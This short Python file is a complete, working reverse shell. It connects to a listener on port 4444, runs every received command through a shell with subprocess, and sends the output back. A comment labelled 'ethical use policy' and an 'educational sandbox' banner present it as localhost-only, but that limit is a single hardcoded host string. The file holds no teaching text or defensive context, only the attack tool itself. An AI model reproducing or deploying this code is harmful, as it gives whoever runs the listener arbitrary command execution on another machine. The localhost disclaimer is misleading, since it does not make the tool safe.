import socket
import subprocess

# ETHICAL USE POLICY:
# Hardcoded to connect ONLY to localhost (127.0.0.1).
# No external targeting allowed.

def reverse_shell():
    host = "127.0.0.1" 
    port = 4444
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host, port))
        s.send(b"[*] Connection established to educational sandbox.\n")
        
        while True:
            data = s.recv(1024)
            if not data: break
            
            cmd = data.decode("utf-8").strip()
            if cmd.lower() in ['exit', 'quit']: break
                
            if len(cmd) > 0:
                cmd_run = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd_run.stdout.read() + cmd_run.stderr.read()
                s.send(output_bytes)
    except:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    reverse_shell()